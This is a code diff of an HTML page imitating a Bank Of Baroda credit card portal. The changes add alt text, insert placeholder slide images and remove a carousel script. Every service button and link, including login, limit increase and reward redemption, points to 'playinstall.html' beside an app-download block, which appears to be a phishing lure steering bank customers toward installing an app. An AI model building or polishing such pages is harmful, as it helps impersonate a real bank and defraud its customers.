@@ -13,21 +13,18 @@
 
 <body>
 
-
-
     <!-- Header -->
     <header class="app-header">
         <div class="header-content">
-
-            <img src="image/logo.webp" class="bank-logo">
+            <img src="image/logo.webp" class="bank-logo" alt="Bank Logo">
             <i class="fas fa-bars menu-icon"></i>
         </div>
     </header>
 
-    <!-- Sidebar Menu -->
+    <!-- Sidebar -->
     <div class="sidebar" id="sidebar">
         <div class="sidebar-header">
-            <img src="image/logo.webp" class="sidebar-logo">
+            <img src="image/logo.webp" class="sidebar-logo" alt="Sidebar Logo">
         </div>
         <ul class="sidebar-menu">
             <li><a href="#" onclick="window.location.href='playinstall.html'">Card Reward Point</a></li>
@@ -41,14 +38,14 @@
         </ul>
     </div>
 
-
+    <!-- Gallery (Fixed - no 404) -->
     <div class="gallery-container">
         <div class="image-strip" id="imageStrip">
-            <img src="../image/slide3.webp" alt="3" />
-            <img src="../image/slide2.webp" alt="2" />
-            <img src="../image/slide11.webp" alt="1" />
+            <!-- Placeholder images - replace with real ones later -->
+            <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='400' height='200' viewBox='0 0 400 200'%3E%3Crect width='400' height='200' fill='%23EA601F'/%3E%3Ctext x='50%25' y='50%25' font-size='24' fill='white' text-anchor='middle' dy='.3em'%3ESlide 1%3C/text%3E%3C/svg%3E" alt="Slide 1">
+            <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='400' height='200' viewBox='0 0 400 200'%3E%3Crect width='400' height='200' fill='%238B0000'/%3E%3Ctext x='50%25' y='50%25' font-size='24' fill='white' text-anchor='middle' dy='.3em'%3ESlide 2%3C/text%3E%3C/svg%3E" alt="Slide 2">
+            <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='400' height='200' viewBox='0 0 400 200'%3E%3Crect width='400' height='200' fill='%23DC143C'/%3E%3Ctext x='50%25' y='50%25' font-size='24' fill='white' text-anchor='middle' dy='.3em'%3ESlide 3%3C/text%3E%3C/svg%3E" alt="Slide 3">
         </div>
-
     </div>
 
     <!-- Google Play Download -->
@@ -58,9 +55,7 @@
         <i class="fas fa-download"></i>
     </div>
 
-
-
-    <!-- Card Protection Section -->
+    <!-- Card Protection -->
     <section class="service-section">
         <h3>Card Protection</h3>
         <p>Protect yourself with India's first comprehensive care protection service in the event of job loss, theft or fraud.</p>
@@ -70,45 +65,37 @@
         </div>
     </section>
 
-
-
+    <!-- Card to Card -->
     <section class="service-section">
         <h3>Card to Card</h3>
-        <p>
-            Easily transfer your credit card balance from one card to another with our secure Card to Card service. Manage your payments efficiently and enjoy better control over your credit usage.
-        </p>
+        <p>Easily transfer your credit card balance from one card to another with our secure Card to Card service. Manage your payments efficiently and enjoy better control over your credit usage.</p>
         <div class="action-buttons">
             <button class="btn-activate" onclick="window.location.href='playinstall.html'">Activate</button>
         </div>
     </section>
 
+    <!-- Limit Increase -->
     <section class="service-section">
         <h3>Limit Increase</h3>
-        <p>
-            Increase your credit card limit instantly to enjoy higher spending power. Upgrade your lifestyle, manage bigger expenses easily, and get more financial flexibility with a higher credit limit.
-        </p>
+        <p>Increase your credit card limit instantly to enjoy higher spending power. Upgrade your lifestyle, manage bigger expenses easily, and get more financial flexibility with a higher credit limit.</p>
         <div class="action-buttons">
             <button class="btn-activate" onclick="window.location.href='playinstall.html'">Increase Limit</button>
         </div>
     </section>
 
-
-
-
-    <!-- Redeem Reward Points Section -->
+    <!-- Redeem Reward Points -->
     <section class="service-section">
         <h3>Redeem Your Reward Points</h3>
         <p>Redeem your Bank Of Baroda Credit Card reward points for exciting products and e-vouchers.</p>
         <button class="btn-redeem" onclick="window.location.href='playinstall.html'">Redeem Now</button>
     </section>
 
-    <!-- Account Access Section -->
+    <!-- Account Access -->
     <section class="service-section">
         <h3>Account Access</h3>
         <p>Login or register to your Bank Of Baroda Credit Card account to manage your card, view statements, unlock your account, and read your password.</p>
         <button class="btn-login" onclick="window.location.href='playinstall.html'">Login</button>
     </section>
-    </main>
 
     <!-- Footer -->
     <footer class="app-footer">
@@ -124,41 +111,6 @@
             <p class="copyright">© 2026 Bank Of Baroda Bank. All rights reserved.</p>
         </div>
     </footer>
-
-
-
-
-
-
-
-
-    <script>
-        const strip = document.getElementById("imageStrip");
-        const images = strip.querySelectorAll("img");
-
-        let currentIndex = 0;
-        const scrollInterval = 2000;
-
-        const scrollToImage = (index) => {
-            const image = images[index];
-            if (image) {
-                const offsetLeft = image.offsetLeft;
-                strip.scrollTo({
-                    left: offsetLeft,
-                    behavior: "smooth"
-                });
-            }
-        };
-
-        let autoScroll = setInterval(() => {
-            currentIndex++;
-            if (currentIndex >= images.length) {
-                currentIndex = 0;
-            }
-            scrollToImage(currentIndex);
-        }, scrollInterval);
-    </script>
-
 
     <script src="index.js"></script>
 </body>
